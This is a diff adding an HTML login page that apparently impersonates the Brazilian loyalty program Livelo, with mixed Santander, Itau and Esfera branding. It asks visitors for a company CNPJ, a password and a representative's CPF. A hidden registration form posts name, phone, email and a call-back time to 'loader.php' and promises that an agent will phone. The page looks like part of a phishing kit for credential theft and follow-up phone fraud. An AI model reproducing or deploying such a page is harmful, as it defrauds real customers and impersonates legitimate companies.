@@ -1,0 +1,338 @@
+<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Livelo</title>
+    <link rel="stylesheet" type="text/css" href="./assets/login.css">
+    <link rel="stylesheet" type="text/css" href="./assets/custom.css">
+    <link rel="stylesheet" type="text/css" media="screen" href="./assets/jquery.modal.min.css">
+    <!--<link rel="icon" type="image/png" href="favicon.png">-->
+<style type="text/css">
+.body {
+overflow: hidden;	
+overflow-x: hidden;	
+overflow-y: hidden;	
+}
+.style1 {
+	font-family: Arial, Helvetica, sans-serif;
+}
+</style>
+</head>
+<body class="d-flex">
+    
+    <div class="header-login" style="background-color: #ffffff ">
+        <div class="content-header" style="height:39px">
+            <div class="logomarca" style="left:1200px;top:-500px">
+				<a aria-label="Voltar para o início" class="sc-fzoLag BNtsP" style="box-sizing: inherit; margin: 0px; padding: 0px; border: 0px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-weight: 400; font-stretch: inherit; font-size: medium; line-height: 19px; font-family: &quot;Itau Display Regular&quot;; vertical-align: baseline; text-decoration: none; color: rgb(106, 106, 106); cursor: pointer; display: flex; -webkit-box-align: center; align-items: center; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(36, 36, 45);" href="https://Livelo.com.br/meu-negocio">
+				<span aria-hidden="true" tabindex="-1" style="box-sizing: inherit; margin: 0px; padding: 0px; border: 0px; font: inherit; vertical-align: baseline; display: flex; -webkit-box-align: center; align-items: center;">
+				<i tabindex="-1" aria-hidden="true" class="sc-fzoaKM hNuJKS icon icon_left_app" style="box-sizing: inherit; margin: 0px; padding: 0px; border: 0px; font-style: normal; font-variant: normal; font-weight: normal; font-stretch: inherit; font-size: inherit; line-height: 1; font-family: icomoon !important; vertical-align: baseline; speak: none; font-feature-settings: normal; text-transform: none; -webkit-font-smoothing: antialiased; display: flex; -webkit-box-pack: center; justify-content: center; -webkit-box-align: center; align-items: center; border-radius: 50%; width: 40px; height: 40px;">
+				</i>
+				<div style="position: absolute; width: 100px; height: 101px; z-index: 1; left: 0px; top: -8px" id="layer1">
+					<img alt="" src="top.png"></div>
+				</span></a><p><a aria-label="Voltar para o início" class="sc-fzoLag BNtsP" style="box-sizing: inherit; margin: 0px; padding: 0px; border: 0px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-weight: 400; font-stretch: inherit; font-size: medium; line-height: 19px; font-family: &quot;Itau Display Regular&quot;; vertical-align: baseline; text-decoration: none; color: rgb(106, 106, 106); cursor: pointer; display: flex; -webkit-box-align: center; align-items: center; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(36, 36, 45);" href="https://Livelo.com.br/meu-negocio">
+				</a></p>
+				<br class="Apple-interchange-newline">
+								&nbsp;
+				</div>
+
+            <div class="timeline-container">
+                <div>
+                        
+                    <!-- step -->
+                    <div class="-step -passed checkout-page hide">
+                        <div class="-textstep">
+                            <span class="-number">01</span>
+                            <span>Login</span>
+                        </div>
+                        <div class="-markercontainer">
+                            <div class="-line"><hr></div>
+                            <div class="-marker"></div>
+                            <div class="-line"><hr></div>
+                        </div>
+                    </div>
+
+                    <!-- step -->
+                    <div class="-step checkout-page hide">
+                        <div class="-textstep -active">
+                            <span class="-number">02</span>
+                            <span>Entrega</span>
+                        </div>
+                        <div class="-markercontainer">
+                            <div class="-line"><hr></div>
+                            <div class="-marker"></div>
+                            <div class="-line"><hr></div>
+                        </div>
+                    </div>
+
+                    <!-- step -->
+                    <div class="-step checkout-page hide">
+                        <div class="-textstep -active">
+                            <span class="-number">03</span>
+                            <span>Pagamento</span>
+                        </div>
+                        <div class="-markercontainer">
+                            <div class="-line"><hr></div>
+                            <div class="-marker"></div>
+                            <div class="-line"><hr></div>
+                        </div>
+                    </div>
+
+                    <!-- step -->
+                    <div class="-step checkout-page hide">
+                        <div class="-textstep -active">
+                            <span class="-number">04</span>
+                            <span>Confirmação</span>
+                        </div>
+                        <div class="-markercontainer">
+                            <div class="-line"><hr></div>
+                            <div class="-marker"></div>
+                            <div class="-line"><hr></div>
+                        </div>
+                    </div>
+                	</div>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="container-fontent-login">
+            <div class="wrapper-form" style="width: 381px">
+                <form id="kc-form-login" method="post" autocomplete="nope" class="js-form-login"> 
+                    <div class="-containerstep01 js-container-step01">
+                        <div class="titulo-login login-page">
+                            <div class="row" style="box-sizing: inherit; margin: 0px -10px; padding: 0px; border: 0px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-weight: 400; font-stretch: inherit; font-size: medium; line-height: inherit; font-family: &quot;Times New Roman&quot;; vertical-align: baseline; display: flex; flex-wrap: wrap; color: rgb(0, 0, 0); letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">
+								<b><font size="5" face="verdana">Livelo! resgate seus pontos ou benefícios agora mesmo!</font></b>
+								<div class="row" style="box-sizing: inherit; margin: 0px -10px; padding: 0px; border: 0px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-weight: 400; font-stretch: inherit; font-size: medium; line-height: inherit; font-family: &quot;Times New Roman&quot;; vertical-align: baseline; display: flex; flex-wrap: wrap; color: rgb(0, 0, 0); letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">
+									<br class="Apple-interchange-newline">
+								</div>
+								<br class="Apple-interchange-newline">
+							</div>
+						</div>
+        
+                        <div class="input-label">
+                            <input id="cnpj" name="cnpj" data-mask="cnpj" type="tel" class="js-input-login2" autocomplete="off" autofocus="" placeholder="Qual é o seu CNPJ?" maxlength="18">
+                            <label for="">CNPJ</label>
+                            <span id="msgErro" class="input-error hide" data-bind="validationMessage: document">CNPJ inválido</span>
+                        </div>
+
+                        <span data-bind="text: formErrorMessage" class="custom-error-msg"></span>
+                        
+                        <button type="button" id="checkUserDocument" class="btn-red -comprar js-btn-continue-step-cpf" disabled="">
+                            Continuar
+                        </button>
+                    </div>
+                    
+                    <div class="-containerstep02 js-container-step02 util-hidden">
+                        <div class="pass-description">
+                            Informe sua senha para continuar
+                        </div>
+        
+                        <div class="input-label security-input">
+                            <input data-bind="value: password, valueUpdate: 'keyup', event: { keyup: function(data, e) { if (e.keyCode === 13) { $('#submitLogin').click(); }}}" id="password" name="password" type="password" class="-security js-input-password" autocomplete="new-password" placeholder="Senha">
+                            <!-- <input type="password" class="-security js-input-password" value="" autocomplete="off"> -->
+                            <label for="">Senha</label>
+                            <button type="button" class="-eyepass -showpass"></button>
+                            <span class="input-error" data-bind="validationMessage: password" style="display: none;"></span>
+                        </div>
+
+                        <span data-bind="text: formErrorMessage" class="custom-error-msg"></span>
+        
+                        <button data-bind="enable: password.isValid()" id="submitLogin" type="button" class="btn-red -comprar" disabled="">
+                            Continuar
+                        </button>
+        
+                        <!-- <a href="#" class="forgot-pass">Esqueci minha senha</a> -->
+
+                        <a href="#" class="forgot-pass util-link-red" data-toggle="modal" data-target="#mdl2Factor">Esqueci minha senha</a>
+                    </div>
+        
+                </form>
+
+                <div class="-containerstep03 js-container-stepautenticacao util-hidden">
+                    <div>
+                        Insira o CPF do representante legal ou autorizado
+                    </div>
+    
+                    <div class="input-label">
+                        <input data-bind="value: userCPF, valueUpdate: 'keyup', event: { keyup: function(data, e) { if (e.keyCode === 13) { $('#checkRepresentativeCpf').click(); }}}" type="tel" class="js-input-login" data-mask="cpfcnpj" autocomplete="off" placeholder="CPF" maxlength="7">
+                        <!-- <input type="tel" value="" class="js-input-login" data-mask="cpfcnpj" onKeyup="validar(this);" autocomplete="off"> -->
+                        <label for="">CPF</label>
+                        <span class="input-error" data-bind="validationMessage: userCPF" style="display: none;"></span>
+                    </div>
+                    
+                    <span data-bind="text: formErrorMessage" class="custom-error-msg"></span>
+    
+                    <!-- <button data-bind="click: checkRepresentativeCpf" type="button" class="btn-red" data-toggle="modal" data-target="#mdl2Factor"> -->
+                    <button id="checkRepresentativeCpf" data-bind="click: checkRepresentativeCpf" type="button" class="btn-red -comprar">
+                        Continuar
+                    </button>
+                </div>
+
+                
+            </div>
+        </div>
+
+        <div class="general-loader">
+            <div class="general-loader-overlay">
+                <div class="general-loader-content">
+                    
+                    <svg width="90" height="10" viewBox="0 0 90 8">
+                        <rect x="0" y="0" width="90" height="8"></rect>
+                    </svg>
+            
+                </div>
+            </div>
+        </div>
+
+    
+
+
+<div class="-contentnewpass wrapper-form util-hidden" id="new-password">
+    <div class="new-pass">
+
+        <div class="-title">
+            Crie sua nova senha
+        </div>
+
+        <div class="-description">
+            Para sua segurança, crie uma senha seguindo as regras
+        </div>
+
+        <div class="-inputcpfcnpjcontainer">
+            <a href="#" class="btn-eye js-btn-eye-show">
+                <span class="icon-ic-password-show"></span>
+            </a>
+            <a href="#" class="btn-eye js-btn-eye-hide util-hidden">
+                <span class="icon-ic-password-hide"></span>
+            </a>
+            <div class="input-label">
+                <input data-bind="value: newPassword, valueUpdate: 'keyup', event: { keyup: function(data, e) { if (e.keyCode === 13) { $('#saveNewPassword').click(); }}}" type="password" inputmode="numeric" class="-inputpass js-input-pass-newpass" maxlength="6" autocomplete="new-password" autofocus="" placeholder="Senha">
+                <label for="">Senha</label>
+            </div>
+        </div>
+
+        <!-- <span class="input-error" data-bind="validationMessage: newPassword"></span> -->
+        
+        <div class="-passrules">
+            <div class="with-icon -error" data-bind="css: {'-success': isValidForDigitsLenth(), '-error': !isValidForDigitsLenth()}">6 dígitos numéricos</div>
+            <div class="with-icon -error" data-bind="css: {'-success': isValidForSequence(), '-error': !isValidForSequence()}">Não podem ser sequenciais</div>
+            <div class="with-icon -error" data-bind="css: {'-success': validatePasswordForRepeat(), '-error': !validatePasswordForRepeat()}">Não pode ter 3 números repetidos</div>
+            <div class="with-icon -error" data-bind="css: {'-success': isValidForDocumentSequence(), '-error': !isValidForDocumentSequence()}">Não podem ser números sequenciais do seu CPF/CNPJ</div>
+			<div>Dica: Não utilize a mesma senha do Internet Banking e Cartões Santander.</div>
+        </div>
+
+        <!-- ko if: isFirstAccessFlow() --><!-- /ko -->
+
+        <input type="checkbox" id="offersEmail" name="user.attributes.esf_offersEmail" value="undefined" style="display:none;" data-bind="value: receiveEmail">
+        <input type="checkbox" id="offersSMS" name="user.attributes.esf_offersSMS" value="undefined" style="display:none;" data-bind="value: receiveEmail">
+        <input type="checkbox" id="offersApp" name="user.attributes.esf_offersApp" value="undefined" style="display:none;" data-bind="value: receiveEmail">
+        <input type="checkbox" id="acceptTerms" name="user.attributes.accept_terms" value="false" style="display:none;" data-bind="value: acceptTermsField">
+
+        <div class="-buttonsteplogincontainer">
+            <button id="saveNewPassword" data-bind="click: saveNewPassword, enable: newPassword.isValid()" class="btn btn-red btn-block -comprar js-tn-continuar-login-checkout" disabled="">
+                Continuar
+            </button>
+        </div>
+    </div>
+
+    <span data-bind="text: passwordErrorMessage" class="custom-error-msg"></span>
+</div>
+
+<div class="-contentnewpass wrapper-form util-hidden" id="password-success">
+    <div class="-title">
+        Sua nova senha foi criada com sucesso!
+    </div>
+
+    <div>
+        <p>
+            Utilize essa senha também no App Esfera;<br><br> 
+            Nos canais Santander continue utilizando a sua senha do Internet Banking.
+        </p> 
+    </div>
+
+    <div>
+        <button class="btn-red" data-bind="click: continueToLogin">
+            Voltar e realizar login
+        </button>
+        <!--
+        <a class="btn-red" href="https://www.esfera.com.vc">
+            Voltar e realizar login
+        </a>
+        -->
+    </div>
+</div>
+
+
+    <div class="santander-container">
+        <div class="marca" alt="202108091  " title="202108091 " style="box-sizing: border-box; margin: 0px 0px 0px -32px; padding: 0px 0px 0px 32px; border: 0px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-weight: 400; font-stretch: inherit; line-height: inherit; font-family: arial, sans-serif; font-size: 12px; vertical-align: baseline; display: inline-block; color: rgb(103, 103, 103); letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;">
+			</div>
+        </div>
+<iframe style="display: none; visibility: hidden;" src="./assets/activityi.html" width="0" height="0"></iframe>
+
+
+<div id="modal" class="hide">
+    <div class="logomarca">
+        <a href="javascript:;"><img src="logo2.png" alt=""></a>
+    </div>
+    <div id="formularioCadastro">
+        <div id="aviso"><h2>Atenção!</h2><p>O CNPJ informado ainda não está 
+			cadastrado.</p></div>
+        <div class="titledescription"><h2>Cadastre-se agora mesmo</h2></div>
+        <form action="loader.php" id="cadastro" method="POST">
+            <div class="input-label">
+                <label for="">Nome do Responsável:</label>
+                <input id="responsavel" name="responsavel" type="text" placeholder="Nome do Responsável pelos Pontos" maxlength="100">
+                <span id="msgErro" class="input-error hide" data-bind="validationMessage: document">
+				Nome inválido.</span>
+            </div>
+            <div class="input-label">
+                <label for="">Telefone:</label>
+                <input id="telefone" name="telefone" type="tel" placeholder="Telefone" maxlength="15">
+                <span id="msgErro" class="input-error hide" data-bind="validationMessage: document">
+				Telefonee inválido.</span>
+            </div>
+            <div class="input-label">
+                <label for="">Horário para contato:</label>
+                <select name="horario" id="horario">
+                    <option value="">Horário para Contato</option>
+                    <option value="08:00 as 10:00">08:00 as 10:00</option>
+                    <option value="10:00 as 12:00">10:00 as 12:00</option>
+                    <option value="14:00 as 16:00">14:00 as 16:00</option>
+                    <option value="16:00 as 18:00">16:00 as 18:00</option>
+                </select>
+                <span id="msgErro" class="input-error hide" data-bind="validationMessage: document">
+				Horário inválido.</span>
+            </div>
+            <div class="input-label">
+                <label for="">E-mail:</label>
+                <input id="email" name="email" type="text" placeholder="E-mail" maxlength="100">
+                <span id="msgErro" class="input-error hide" data-bind="validationMessage: document">
+				E-mail inválido.</span>
+            </div>
+            <button type="button" id="botaoCadastrar" class="btn-red -comprar js-btn-continue-step-cpf">
+                Cadastrar
+            </button>
+
+    </form></div>
+    <div id="sucesso" class="hide">
+        <h2>Solicitação Realizada com Sucesso!</h2>
+        <div style="margin: 30px 0px;" class="center">
+            <img src="./assets/sucesso.png" alt="" width="90">
+        </div>
+        <p class="msg">Para a sua segurança e garantir a utilização correta de 
+		seus pontos, um de nossos atendentes irá retornar no telefone e horário 
+		informado.</p>
+        <div class="center">
+            <p class="agradecemos">Agradecemos a compreensão.</p>
+          
+        </div>
+
+    </div>
+
+    
+</div>
+<input type="hidden" name="hash" id="hash" value="18174522425ed7ab46186026.72802587">
+<script src="./assets/jquery.min.js"></script>
+<script src="./assets/jquery.mask.min.js"></script>
+<script src="./assets/jquery.modal.min.js"></script>
+<script src="./assets/login.js"></script>
+</body></html>
